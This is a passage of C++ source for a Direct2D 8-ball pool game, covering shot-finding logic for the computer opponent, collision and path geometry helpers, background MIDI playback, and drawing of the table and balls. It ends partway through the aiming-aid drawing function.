    bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection)
    {
        float denominator = (p4.y - p3.y) * (p2.x - p1.x) - (p4.x - p3.x) * (p2.y - p1.y);

        // Check if lines are parallel or collinear
        if (fabs(denominator) < 1e-6) {
            return false;
        }

        float ua = ((p4.x - p3.x) * (p1.y - p3.y) - (p4.y - p3.y) * (p1.x - p3.x)) / denominator;
        float ub = ((p2.x - p1.x) * (p1.y - p3.y) - (p2.y - p1.y) * (p1.x - p3.x)) / denominator;

        // Check if intersection point lies on both segments
        if (ua >= 0.0f && ua <= 1.0f && ub >= 0.0f && ub <= 1.0f) {
            intersection.x = p1.x + ua * (p2.x - p1.x);
            intersection.y = p1.y + ua * (p2.y - p1.y);
            return true;
        }

        return false;
    }

    // --- INSERT NEW HELPER FUNCTION HERE ---
    // Calculates the squared distance from point P to the line segment AB.
    float PointToLineSegmentDistanceSq(D2D1_POINT_2F p, D2D1_POINT_2F a, D2D1_POINT_2F b) {
        float l2 = GetDistanceSq(a.x, a.y, b.x, b.y);
        if (l2 == 0.0f) return GetDistanceSq(p.x, p.y, a.x, a.y); // Segment is a point
        // Consider P projecting onto the line AB infinite line
        // t = [(P-A) . (B-A)] / |B-A|^2
        float t = ((p.x - a.x) * (b.x - a.x) + (p.y - a.y) * (b.y - a.y)) / l2;
        t = std::max(0.0f, std::min(1.0f, t)); // Clamp t to the segment [0, 1]
        // Projection falls on the segment
        D2D1_POINT_2F projection = D2D1::Point2F(a.x + t * (b.x - a.x), a.y + t * (b.y - a.y));
        return GetDistanceSq(p.x, p.y, projection.x, projection.y);
    }
    // --- End New Helper ---

    // --- NEW AI Implementation Functions ---

    void AIMakeDecision() {
        // Start with a clean slate for the AI's plan.
        aiPlannedShotDetails.isValid = false;
        Ball* cueBall = GetCueBall();
        if (!cueBall || !isPlayer2AI || currentPlayer != 2) return;

        // Ask the ""expert"" (AIFindBestShot) for the best possible shot.
        AIShotInfo bestShot = AIFindBestShot();

        if (bestShot.possible) {
            // A good shot was found.
            // If it's an 8-ball shot, ""call"" the pocket.
            if (bestShot.involves8Ball) {
                calledPocketP2 = bestShot.pocketIndex;
            }
            else {
                calledPocketP2 = -1; // Ensure no pocket is called on a normal shot.
            }

            // Commit the details of the best shot to the AI's plan.
            aiPlannedShotDetails.angle = bestShot.angle;
            aiPlannedShotDetails.power = bestShot.power;
            aiPlannedShotDetails.spinX = bestShot.spinX;
            aiPlannedShotDetails.spinY = bestShot.spinY;
            aiPlannedShotDetails.isValid = true;

        }
        else {
            // No good offensive shot found, must play a safe defensive shot.
            // (This is a fallback and your current AIFindBestShot should prevent this)
            aiPlannedShotDetails.isValid = false;
        }

        // --- FOOLPROOF FIX: Trigger the Aim Display ---
        // If any valid plan was made, update the visuals and start the display pause.
        if (aiPlannedShotDetails.isValid) {

            // STEP 1: Copy the AI's plan into the global variables used for drawing.
            // This is the critical missing link.
            cueAngle = aiPlannedShotDetails.angle;
            shotPower = aiPlannedShotDetails.power;

            // STEP 2: Trigger the visual display pause.
            // These are the two lines you correctly identified.
            aiIsDisplayingAim = true;
            aiAimDisplayFramesLeft = AI_AIM_DISPLAY_DURATION_FRAMES;

        }
        else {
            // Absolute fallback: If no plan could be made, switch turns to prevent a freeze.
            SwitchTurns();
        }
    }


    AIShotInfo AIFindBestShot()
    {
        AIShotInfo best;                       // .possible == false
        Ball* cue = GetCueBall();
        if (!cue) return best;

        const bool on8 = IsPlayerOnEightBall(2);
        const BallType wantType = player2Info.assignedType;

        for (Ball& b : balls)
        {
            if (b.isPocketed || b.id == 0) continue;

            // decide if this ball is a legal/interesting target
            bool ok =
                on8 ? (b.id == 8) :
                ((wantType == BallType::NONE) || (b.type == wantType));

            if (!ok) continue;

            for (int p = 0; p < 6; ++p)
            {
                AIShotInfo cand = EvaluateShot(&b, p);
                if (cand.possible &&
                    (!best.possible || cand.score > best.score))
                    best = cand;
            }
        }

        // fall-back: tap cue ball forward (safety) if no potting line exists
        if (!best.possible && cue)
        {
            best.possible = true;
            best.angle = static_cast<float>(rand()) / RAND_MAX * 2.0f * PI;
            best.power = MAX_SHOT_POWER * 0.30f;
            best.spinX = best.spinY = 0.0f;
            best.targetBall = nullptr;
            best.score = -99999.0f;
            best.pocketIndex = -1;
        }
        return best;
    }


    // Evaluate a potential shot at a specific target ball towards a specific pocket
    AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex) {
        AIShotInfo shotInfo; // Defaults to not possible
        shotInfo.targetBall = targetBall;
        shotInfo.pocketIndex = pocketIndex;
        shotInfo.involves8Ball = (targetBall && targetBall->id == 8);

        Ball* cueBall = GetCueBall();
        if (!cueBall || !targetBall) return shotInfo;

        // 1. Calculate Ghost Ball position (where cue must hit target)
        shotInfo.ghostBallPos = CalculateGhostBallPos(targetBall, pocketIndex);

        // 2. Check Path: Cue Ball -> Ghost Ball Position
        if (!IsPathClear(D2D1::Point2F(cueBall->x, cueBall->y), shotInfo.ghostBallPos, cueBall->id, targetBall->id)) {
            return shotInfo; // Path blocked, shot is impossible.
        }

        // 3. Calculate Angle and Power
        float dx = shotInfo.ghostBallPos.x - cueBall->x;
        float dy = shotInfo.ghostBallPos.y - cueBall->y;
        shotInfo.angle = atan2f(dy, dx);

        float cueToGhostDist = GetDistance(cueBall->x, cueBall->y, shotInfo.ghostBallPos.x, shotInfo.ghostBallPos.y);
        float targetToPocketDist = GetDistance(targetBall->x, targetBall->y, pocketPositions[pocketIndex].x, pocketPositions[pocketIndex].y);
        shotInfo.power = CalculateShotPower(cueToGhostDist, targetToPocketDist);

        // 4. Score the shot (simple scoring: closer and straighter is better)
        shotInfo.score = 1000.0f - (cueToGhostDist + targetToPocketDist);

        // If we reached here, the shot is geometrically possible.
        shotInfo.possible = true;
        return shotInfo;
    }


    //  Estimate the power that will carry the cue-ball to the ghost position
    //  *and* push the object-ball the remaining distance to the pocket.
    //
    //  • cueToGhostDist    – pixels from cue to ghost-ball centre
    //  • targetToPocketDist– pixels from object-ball to chosen pocket
    //
    //  The function is fully deterministic (good for AI search) yet produces
    //  human-looking power levels.
    //
    float CalculateShotPower(float cueToGhostDist, float targetToPocketDist)
    {
        // Total distance the *energy* must cover (cue path + object-ball path)
        float totalDist = cueToGhostDist + targetToPocketDist;

        // Typical diagonal of the playable area (approx.) – used for scaling
        constexpr float TABLE_DIAG = 900.0f;

        // 1.  Convert distance to a 0-1 number (0: tap-in, 1: table length)
        float norm = std::clamp(totalDist / TABLE_DIAG, 0.0f, 1.0f);

        // 2.  Ease-in curve (smoothstep) for nicer progression
        norm = norm * norm * (3.0f - 2.0f * norm);

        // 3.  Blend between a gentle minimum and the absolute maximum
        const float MIN_POWER = MAX_SHOT_POWER * 0.18f;     // just enough to move
        float power = MIN_POWER + norm * (MAX_SHOT_POWER - MIN_POWER);

        // 4.  Safety clamp (also screens out degenerate calls)
        power = std::clamp(power, 0.15f, MAX_SHOT_POWER);

        return power;
    }

    // ------------------------------------------------------------------
    //  Return the ghost-ball centre needed for the target ball to roll
    //  straight into the chosen pocket.
    // ------------------------------------------------------------------
    D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex)
    {
        if (!targetBall) return D2D1::Point2F(0, 0);

        D2D1_POINT_2F P = pocketPositions[pocketIndex];

        float vx = P.x - targetBall->x;
        float vy = P.y - targetBall->y;
        float L = sqrtf(vx * vx + vy * vy);
        if (L < 1.0f) L = 1.0f;                // safety

        vx /= L;   vy /= L;

        return D2D1::Point2F(
            targetBall->x - vx * (BALL_RADIUS * 2.0f),
            targetBall->y - vy * (BALL_RADIUS * 2.0f));
    }

    // Calculate the position the cue ball needs to hit for the target ball to go towards the pocket
    // ────────────────────────────────────────────────────────────────
    //   2.  Shot evaluation & search
    // ────────────────────────────────────────────────────────────────

    //  Calculate ghost-ball position so that cue hits target towards pocket
    static inline D2D1_POINT_2F GhostPos(const Ball* tgt, int pocketIdx)
    {
        D2D1_POINT_2F P = pocketPositions[pocketIdx];
        float vx = P.x - tgt->x;
        float vy = P.y - tgt->y;
        float L = sqrtf(vx * vx + vy * vy);
        vx /= L;  vy /= L;
        return D2D1::Point2F(tgt->x - vx * (BALL_RADIUS * 2.0f),
            tgt->y - vy * (BALL_RADIUS * 2.0f));
    }

    //  Heuristic: shorter + straighter + proper group = higher score
    static inline float ScoreShot(float cue2Ghost,
        float tgt2Pocket,
        bool  correctGroup,
        bool  involves8)
    {
        float base = 2000.0f - (cue2Ghost + tgt2Pocket);   // prefer close shots
        if (!correctGroup)  base -= 400.0f;                  // penalty
        if (involves8)      base += 150.0f;                  // a bit more desirable
        return base;
    }

    // Checks if line segment is clear of obstructing balls
    // ────────────────────────────────────────────────────────────────
    //   1.  Low-level helpers – IsPathClear & FindFirstHitBall
    // ────────────────────────────────────────────────────────────────

    //  Test if the capsule [ start … end ] (radius = BALL_RADIUS)
    //  intersects any ball except the ids we want to ignore.
    bool IsPathClear(D2D1_POINT_2F start,
        D2D1_POINT_2F end,
        int ignoredBallId1,
        int ignoredBallId2)
    {
        float dx = end.x - start.x;
        float dy = end.y - start.y;
        float lenSq = dx * dx + dy * dy;
        if (lenSq < 1e-3f) return true;             // degenerate → treat as clear

        for (const Ball& b : balls)
        {
            if (b.isPocketed)      continue;
            if (b.id == ignoredBallId1 ||
                b.id == ignoredBallId2)             continue;

            // project ball centre onto the segment
            float t = ((b.x - start.x) * dx + (b.y - start.y) * dy) / lenSq;
            t = std::clamp(t, 0.0f, 1.0f);

            float cx = start.x + t * dx;
            float cy = start.y + t * dy;

            if (GetDistanceSq(b.x, b.y, cx, cy) < (BALL_RADIUS * BALL_RADIUS))
                return false;                       // blocked
        }
        return true;
    }

    //  Cast an (infinite) ray and return the first non-pocketed ball hit.
    //  `hitDistSq` is distance² from the start point to the collision point.
    Ball* FindFirstHitBall(D2D1_POINT_2F start,
        float        angle,
        float& hitDistSq)
    {
        Ball* hitBall = nullptr;
        float  bestSq = std::numeric_limits<float>::max();
        float  cosA = cosf(angle);
        float  sinA = sinf(angle);

        for (Ball& b : balls)
        {
            if (b.id == 0 || b.isPocketed) continue;         // ignore cue & sunk balls

            float relX = b.x - start.x;
            float relY = b.y - start.y;
            float proj = relX * cosA + relY * sinA;          // distance along the ray

            if (proj <= 0) continue;                         // behind cue

            // closest approach of the ray to the sphere centre
            float closestX = start.x + proj * cosA;
            float closestY = start.y + proj * sinA;
            float dSq = GetDistanceSq(b.x, b.y, closestX, closestY);

            if (dSq <= BALL_RADIUS * BALL_RADIUS)            // intersection
            {
                float back = sqrtf(BALL_RADIUS * BALL_RADIUS - dSq);
                float collDist = proj - back;                // front surface
                float collSq = collDist * collDist;
                if (collSq < bestSq)
                {
                    bestSq = collSq;
                    hitBall = &b;
                }
            }
        }
        hitDistSq = bestSq;
        return hitBall;
    }

    // Basic check for reasonable AI aim angles (optional)
    bool IsValidAIAimAngle(float angle) {
        // Placeholder - could check for NaN or infinity if calculations go wrong
        return isfinite(angle);
    }

    //midi func = start
    void PlayMidiInBackground(HWND hwnd, const TCHAR* midiPath) {
        while (isMusicPlaying) {
            MCI_OPEN_PARMS mciOpen = { 0 };
            mciOpen.lpstrDeviceType = TEXT(""sequencer"");
            mciOpen.lpstrElementName = midiPath;

            if (mciSendCommand(0, MCI_OPEN, MCI_OPEN_TYPE | MCI_OPEN_ELEMENT, (DWORD_PTR)&mciOpen) == 0) {
                midiDeviceID = mciOpen.wDeviceID;

                MCI_PLAY_PARMS mciPlay = { 0 };
                mciSendCommand(midiDeviceID, MCI_PLAY, 0, (DWORD_PTR)&mciPlay);

                // Wait for playback to complete
                MCI_STATUS_PARMS mciStatus = { 0 };
                mciStatus.dwItem = MCI_STATUS_MODE;

                do {
                    mciSendCommand(midiDeviceID, MCI_STATUS, MCI_STATUS_ITEM, (DWORD_PTR)&mciStatus);
                    Sleep(100); // adjust as needed
                } while (mciStatus.dwReturn == MCI_MODE_PLAY && isMusicPlaying);

                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }
    }

    void StartMidi(HWND hwnd, const TCHAR* midiPath) {
        if (isMusicPlaying) {
            StopMidi();
        }
        isMusicPlaying = true;
        musicThread = std::thread(PlayMidiInBackground, hwnd, midiPath);
    }

    void StopMidi() {
        if (isMusicPlaying) {
            isMusicPlaying = false;
            if (musicThread.joinable()) musicThread.join();
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }
    }

    /*void PlayGameMusic(HWND hwnd) {
        // Stop any existing playback
        if (isMusicPlaying) {
            isMusicPlaying = false;
            if (musicThread.joinable()) {
                musicThread.join();
            }
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
            }
        }

        // Get the path of the executable
        TCHAR exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);

        // Extract the directory path
        TCHAR* lastBackslash = _tcsrchr(exePath, '\\');
        if (lastBackslash != NULL) {
            *(lastBackslash + 1) = '\0';
        }

        // Construct the full path to the MIDI file
        static TCHAR midiPath[MAX_PATH];
        _tcscpy_s(midiPath, MAX_PATH, exePath);
        _tcscat_s(midiPath, MAX_PATH, TEXT(""BSQ.MID""));

        // Start the background playback
        isMusicPlaying = true;
        musicThread = std::thread(PlayMidiInBackground, hwnd, midiPath);
    }*/
    //midi func = end

    // --- Drawing Functions ---

    void OnPaint() {
        HRESULT hr = CreateDeviceResources(); // Ensure resources are valid

        if (SUCCEEDED(hr)) {
            pRenderTarget->BeginDraw();
            DrawScene(pRenderTarget); // Pass render target
            hr = pRenderTarget->EndDraw();

            if (hr == D2DERR_RECREATE_TARGET) {
                DiscardDeviceResources();
                // Optionally request another paint message: InvalidateRect(hwndMain, NULL, FALSE);
                // But the timer loop will trigger redraw anyway.
            }
        }
        // If CreateDeviceResources failed, EndDraw might not be called.
        // Consider handling this more robustly if needed.
    }

    void DrawScene(ID2D1RenderTarget* pRT) {
        if (!pRT) return;

        //pRT->Clear(D2D1::ColorF(D2D1::ColorF::LightGray)); // Background color
        // Set background color to #ffffcd (RGB: 255, 255, 205)
        pRT->Clear(D2D1::ColorF(0.3686f, 0.5333f, 0.3882f)); // Clear with light yellow background NEWCOLOR 1.0f, 1.0f, 0.803f => (0.3686f, 0.5333f, 0.3882f)
        //pRT->Clear(D2D1::ColorF(1.0f, 1.0f, 0.803f)); // Clear with light yellow background NEWCOLOR 1.0f, 1.0f, 0.803f => (0.3686f, 0.5333f, 0.3882f)

        DrawTable(pRT, pFactory);
        DrawPocketSelectionIndicator(pRT); // Draw arrow over selected/called pocket
        DrawBalls(pRT);
        DrawAimingAids(pRT); // Includes cue stick if aiming
        DrawUI(pRT);
        DrawPowerMeter(pRT);
        DrawSpinIndicator(pRT);
        DrawPocketedBallsIndicator(pRT);
        DrawBallInHandIndicator(pRT); // Draw cue ball ghost if placing

         // Draw Game Over Message
        if (currentGameState == GAME_OVER && pTextFormat) {
            ID2D1SolidColorBrush* pBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pBrush);
            if (pBrush) {
                D2D1_RECT_F layoutRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP + TABLE_HEIGHT / 2 - 30, TABLE_RIGHT, TABLE_TOP + TABLE_HEIGHT / 2 + 30);
                pRT->DrawText(
                    gameOverMessage.c_str(),
                    (UINT32)gameOverMessage.length(),
                    pTextFormat, // Use large format maybe?
                    &layoutRect,
                    pBrush
                );
                SafeRelease(&pBrush);
            }
        }

    }

    void DrawTable(ID2D1RenderTarget* pRT, ID2D1Factory* pFactory) {
        ID2D1SolidColorBrush* pBrush = nullptr;

        // === Draw Full Orange Frame (Table Border) ===
        ID2D1SolidColorBrush* pFrameBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.9157f, 0.6157f, 0.2000f), &pFrameBrush); //NEWCOLOR ::Orange (no brackets) => (0.9157, 0.6157, 0.2000)
        //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pFrameBrush); //NEWCOLOR ::Orange (no brackets) => (0.9157, 0.6157, 0.2000)
        if (pFrameBrush) {
            D2D1_RECT_F outerRect = D2D1::RectF(
                TABLE_LEFT - CUSHION_THICKNESS,
                TABLE_TOP - CUSHION_THICKNESS,
                TABLE_RIGHT + CUSHION_THICKNESS,
                TABLE_BOTTOM + CUSHION_THICKNESS
            );
            pRT->FillRectangle(&outerRect, pFrameBrush);
            SafeRelease(&pFrameBrush);
        }

        // Draw Table Bed (Green Felt)
        pRT->CreateSolidColorBrush(TABLE_COLOR, &pBrush);
        if (!pBrush) return;
        D2D1_RECT_F tableRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP, TABLE_RIGHT, TABLE_BOTTOM);
        pRT->FillRectangle(&tableRect, pBrush);
        SafeRelease(&pBrush);

        // Draw Cushions (Red Border)
        pRT->CreateSolidColorBrush(CUSHION_COLOR, &pBrush);
        if (!pBrush) return;
        // Top Cushion (split by middle pocket)
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
        // Bottom Cushion (split by middle pocket)
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
        // Left Cushion
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT - CUSHION_THICKNESS, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_LEFT, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
        // Right Cushion
        pRT->FillRectangle(D2D1::RectF(TABLE_RIGHT, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_RIGHT + CUSHION_THICKNESS, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
        SafeRelease(&pBrush);


        // Draw Pockets (Black Circles)
        pRT->CreateSolidColorBrush(POCKET_COLOR, &pBrush);
        if (!pBrush) return;
        for (int i = 0; i < 6; ++i) {
            D2D1_ELLIPSE ellipse = D2D1::Ellipse(pocketPositions[i], HOLE_VISUAL_RADIUS, HOLE_VISUAL_RADIUS);
            pRT->FillEllipse(&ellipse, pBrush);
        }
        SafeRelease(&pBrush);

        // Draw Headstring Line (White)
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.4235f, 0.5647f, 0.1765f, 1.0f), &pBrush); // NEWCOLOR ::White => (0.2784, 0.4549, 0.1843)
        //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pBrush); // NEWCOLOR ::White => (0.2784, 0.4549, 0.1843)
        if (!pBrush) return;
        pRT->DrawLine(
            D2D1::Point2F(HEADSTRING_X, TABLE_TOP),
            D2D1::Point2F(HEADSTRING_X, TABLE_BOTTOM),
            pBrush,
            1.0f // Line thickness
        );
        SafeRelease(&pBrush);

        // Draw Semicircle facing West (flat side East)
        // Draw Semicircle facing East (curved side on the East, flat side on the West)
        ID2D1PathGeometry* pGeometry = nullptr;
        HRESULT hr = pFactory->CreatePathGeometry(&pGeometry);
        if (SUCCEEDED(hr) && pGeometry)
        {
            ID2D1GeometrySink* pSink = nullptr;
            hr = pGeometry->Open(&pSink);
            if (SUCCEEDED(hr) && pSink)
            {
                float radius = 60.0f; // Radius for the semicircle
                D2D1_POINT_2F center = D2D1::Point2F(HEADSTRING_X, (TABLE_TOP + TABLE_BOTTOM) / 2.0f);

                // For a semicircle facing East (curved side on the East), use the top and bottom points.
                D2D1_POINT_2F startPoint = D2D1::Point2F(center.x, center.y - radius); // Top point

                pSink->BeginFigure(startPoint, D2D1_FIGURE_BEGIN_HOLLOW);

                D2D1_ARC_SEGMENT arc = {};
                arc.point = D2D1::Point2F(center.x, center.y + radius); // Bottom point
                arc.size = D2D1::SizeF(radius, radius);
                arc.rotationAngle = 0.0f;
                // Use the correct identifier with the extra underscore:
                arc.sweepDirection = D2D1_SWEEP_DIRECTION_COUNTER_CLOCKWISE;
                arc.arcSize = D2D1_ARC_SIZE_SMALL;

                pSink->AddArc(&arc);
                pSink->EndFigure(D2D1_FIGURE_END_OPEN);
                pSink->Close();
                SafeRelease(&pSink);

                ID2D1SolidColorBrush* pArcBrush = nullptr;
                //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.3f), &pArcBrush);
                pRT->CreateSolidColorBrush(D2D1::ColorF(0.4235f, 0.5647f, 0.1765f, 1.0f), &pArcBrush);
                if (pArcBrush)
                {
                    pRT->DrawGeometry(pGeometry, pArcBrush, 1.5f);
                    SafeRelease(&pArcBrush);
                }
            }
            SafeRelease(&pGeometry);
        }




    }


    void DrawBalls(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pStripeBrush = nullptr; // For stripe pattern

        pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBrush); // Placeholder
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);

        if (!pBrush || !pStripeBrush) {
            SafeRelease(&pBrush);
            SafeRelease(&pStripeBrush);
            return;
        }


        for (size_t i = 0; i < balls.size(); ++i) {
            const Ball& b = balls[i];
            if (!b.isPocketed) {
                D2D1_ELLIPSE ellipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS, BALL_RADIUS);

                // Set main ball color
                pBrush->SetColor(b.color);
                pRT->FillEllipse(&ellipse, pBrush);

                // Draw Stripe if applicable
                if (b.type == BallType::STRIPE) {
                    // Draw a white band across the middle (simplified stripe)
                    D2D1_RECT_F stripeRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS * 0.4f, b.x + BALL_RADIUS, b.y + BALL_RADIUS * 0.4f);
                    // Need to clip this rectangle to the ellipse bounds - complex!
                    // Alternative: Draw two colored arcs leaving a white band.
                    // Simplest: Draw a white circle inside, slightly smaller.
                    D2D1_ELLIPSE innerEllipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS * 0.6f, BALL_RADIUS * 0.6f);
                    pRT->FillEllipse(innerEllipse, pStripeBrush); // White center part
                    pBrush->SetColor(b.color); // Set back to stripe color
                    pRT->FillEllipse(innerEllipse, pBrush); // Fill again, leaving a ring - No, this isn't right.

                    // Let's try drawing a thick white line across
                    // This doesn't look great. Just drawing solid red for stripes for now.
                }

                // Draw Number (Optional - requires more complex text layout or pre-rendered textures)
                // if (b.id != 0 && pTextFormat) {
                //     std::wstring numStr = std::to_wstring(b.id);
                //     D2D1_RECT_F textRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS, b.x + BALL_RADIUS, b.y + BALL_RADIUS);
                //     ID2D1SolidColorBrush* pNumBrush = nullptr;
                //     D2D1_COLOR_F numCol = (b.type == BallType::SOLID || b.id == 8) ? D2D1::ColorF(D2D1::ColorF::Black) : D2D1::ColorF(D2D1::ColorF::White);
                //     pRT->CreateSolidColorBrush(numCol, &pNumBrush);
                //     // Create a smaller text format...
                //     // pRT->DrawText(numStr.c_str(), numStr.length(), pSmallTextFormat, &textRect, pNumBrush);
                //     SafeRelease(&pNumBrush);
                // }
            }
        }

        SafeRelease(&pBrush);
        SafeRelease(&pStripeBrush);
    }


    /*void DrawAimingAids(ID2D1RenderTarget* pRT) {
        // Condition check at start (Unchanged)
        //if (currentGameState != PLAYER1_TURN && currentGameState != PLAYER2_TURN &&
            //currentGameState != BREAKING && currentGameState != AIMING)
        //{
            //return;
        //}
            // NEW Condition: Allow drawing if it's a human player's active turn/aiming/breaking,
        // OR if it's AI's turn and it's in AI_THINKING state (calculating) or BREAKING (aiming break).
        bool isHumanInteracting = (!isPlayer2AI || currentPlayer == 1) &&
            (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == BREAKING || currentGameState == AIMING);
        // AI_THINKING state is when AI calculates shot. AIMakeDecision sets cueAngle/shotPower.
        // Also include BREAKING state if it's AI's turn and isOpeningBreakShot for break aim visualization.
            // NEW Condition: AI is displaying its aim
        bool isAiVisualizingShot = (isPlayer2AI && currentPlayer == 2 &&
            currentGameState == AI_THINKING && aiIsDisplayingAim);

        if (!isHumanInteracting && !(isAiVisualizingShot || (currentGameState == AI_THINKING && aiIsDisplayingAim))) {
            return;
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall || cueBall->isPocketed) return; // Don't draw if cue ball is gone

        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        ID2D1StrokeStyle* pDashedStyle = nullptr;
        ID2D1SolidColorBrush* pCueBrush = nullptr;
        ID2D1SolidColorBrush* pReflectBrush = nullptr; // Brush for reflection line

        // Ensure render target is valid
        if (!pRT) return;

        // Create Brushes and Styles (check for failures)
        HRESULT hr;
        hr = pRT->CreateSolidColorBrush(AIM_LINE_COLOR, &pBrush);
        if FAILED(hr) { SafeRelease(&pBrush); return; }
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pGhostBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); return; }
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0.6f, 0.4f, 0.2f), &pCueBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); return; }
        // Create reflection brush (e.g., lighter shade or different color)
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LightCyan, 0.6f), &pReflectBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); SafeRelease(&pReflectBrush); return; }
        // Create a Cyan brush for primary and secondary lines //orig(75.0f / 255.0f, 0.0f, 130.0f / 255.0f);indigoColor
        D2D1::ColorF cyanColor(0.0, 255.0, 255.0, 255.0f);
        ID2D1SolidColorBrush* pCyanBrush = nullptr;
        hr = pRT->CreateSolidColorBrush(cyanColor, &pCyanBrush);
        if (FAILED(hr)) {
            SafeRelease(&pCyanBrush);
            // handle error if needed
        }
        // Create a Purple brush for primary and secondary lines
        D2D1::ColorF purpleColor(255.0f, 0.0f, 255.0f, 255.0f);
        ID2D1SolidColorBrush* pPurpleBrush = nullptr;
        hr = pRT->CreateSolidColorBrush(purpleColor, &pPurpleBrush);
        if (FAILED(hr)) {
            SafeRelease(&pPurpleBrush);
            // handle error if needed
        }

        if (pFactory) {
            D2D1_STROKE_STYLE_PROPERTIES strokeProps = D2D1::StrokeStyleProperties();
            strokeProps.dashStyle = D2D1_DASH_STYLE_DASH;
            hr = pFactory->CreateStrokeStyle(&strokeProps, nullptr, 0, &pDashedStyle);
            if FAILED(hr) { pDashedStyle = nullptr; }
        }


        // --- Cue Stick Drawing (Unchanged from previous fix) ---
        const float baseStickLength = 150.0f;
        const float baseStickThickness = 4.0f;
        float stickLength = baseStickLength * 1.4f;
        float stickThickness = baseStickThickness * 1.5f;
        float stickAngle = cueAngle + PI;
        float powerOffset = 0.0f;
        //if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
            // Show power offset if human is aiming/dragging, or if AI is preparing its shot (AI_THINKING or AI Break)
        if ((isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) || isAiVisualizingShot) { // Use the new condition
            powerOffset = shotPower * 5.0f;
        }
        D2D1_POINT_2F cueStickEnd = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (stickLength + powerOffset), cueBall->y + sinf(stickAngle) * (stickLength + powerOffset));
        D2D1_POINT_2F cueStickTip = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (powerOffset + 5.0f), cueBall->y + sinf(stickAngle) * (powerOffset + 5.0f));
        pRT->DrawLine(cueStickTip, cueStickEnd, pCueBrush, stickThickness);


        // --- Projection Line Calculation ---
        float cosA = cosf(cueAngle);
        float sinA = sinf(cueAngle);
        float rayLength = TABLE_WIDTH + TABLE_HEIGHT; // Ensure ray is long enough
        D2D1_POINT_2F rayStart = D2D1::Point2F(cueBall->x, cueBall->y);
        D2D1_POINT_2F rayEnd = D2D1::Point2F(rayStart.x + cosA * rayLength, rayStart.y + sinA * rayLength);*/

    void DrawAimingAids(ID2D1RenderTarget* pRT) {
        // Determine if aiming aids should be drawn.
        bool isHumanInteracting = (!isPlayer2AI || currentPlayer == 1) &&
            (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == BREAKING || currentGameState == AIMING ||
                currentGameState == CHOOSING_POCKET_P1 || currentGameState == CHOOSING_POCKET_P2);

        // FOOLPROOF FIX: This is the new condition to show the AI's aim.
        bool isAiVisualizingShot = (isPlayer2AI && currentPlayer == 2 && aiIsDisplayingAim);

